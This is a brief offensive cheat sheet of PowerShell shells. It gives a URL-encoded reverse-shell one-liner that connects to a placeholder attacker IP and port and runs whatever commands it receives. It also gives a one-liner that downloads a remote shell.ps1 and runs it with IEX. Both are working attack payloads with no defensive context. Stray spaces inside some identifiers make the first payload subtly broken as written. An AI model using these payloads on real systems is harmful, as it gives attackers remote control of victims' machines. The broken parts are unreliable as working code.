## Powershell shells

###PowerShell Reverse Shell ( & and + symbols URLencoded )
```
powershell -c "%24client = New-Object System.Net.Sockets.TCPClient('<ipp>',<port>);%24stream = %24client.GetStream();[byte[]]%24bytes = 0..65535|%{0};while((%24i = %24stream.Read(%24bytes, 0, %24bytes.Length)) -ne 0){;%24data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString(%24bytes,0, %24i);%24sendback = (iex %24data 2>&1 | Out-String ); %24sendback2 = %24sendback %2B 'PS ' %2B (pwd).Path %2B '> ';%24sendbyte = ([text.encoding]::ASCII ).GetBytes(%24sendback2);%24stream.Write(%24sendbyte,0,%24sendbyte.Length);%24stream.Flush()};%24c lient.Close()"
```
Download a bindshell
```
'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://IP:8000/shell.ps1\")"'
```
